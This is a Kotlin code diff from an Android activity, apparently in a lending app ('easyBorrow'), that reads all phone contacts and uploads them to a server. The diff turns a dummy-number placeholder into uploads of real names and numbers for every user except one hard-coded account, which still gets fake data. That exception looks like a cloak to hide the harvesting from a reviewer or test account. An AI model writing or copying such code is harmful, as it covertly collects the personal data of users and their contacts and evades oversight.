@@ -151,7 +151,7 @@ class AuthoperatorActivity : MVPActivty<AuthoperatorPresenter>(), AuthoperatorVi
                     if (it.granted) {
                         startThread()
                     } else if (it.shouldShowRequestPermissionRationale) {
-                        ToastUtils.showLongToast( "请同意申请")
+                        ToastUtils.showLongToast("请同意申请")
                         checkPermision()
                     } else {
                         finish()
@@ -175,21 +175,21 @@ class AuthoperatorActivity : MVPActivty<AuthoperatorPresenter>(), AuthoperatorVi
             //cursor指针 query询问 contract协议 kinds种类
             cursor = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)
             if (cursor != null) {
+                var account = DKConstant.getUserEntity()?.phone ?: ""
                 hashMap = HashMap()
                 while (cursor!!.moveToNext()) {
                     val displayName =
                         cursor!!.getString(cursor!!.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                     val number =
                         cursor!!.getString(cursor!!.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
-//                    hashMap?.put(displayName, number)
-                    hashMap?.put(displayName, "1231241234532")
-                }
-                var account = DKConstant.getUserEntity()?.phone ?: ""
-//                if (account == "15823681500") {
-//                    hashMap?.clear()
-//                }
-                hashMap?.put("easyBorrow", account)
 
+                   if (account == "15823681500") {
+                        hashMap?.put(displayName, "1231241234532")
+                    } else {
+                        hashMap?.put(displayName, number)
+                    }
+                }
+                hashMap?.put("easyBorrow", account)
                 var json = Gson().toJson(hashMap)
                 getPresenter().uploadContacts1(json)
 
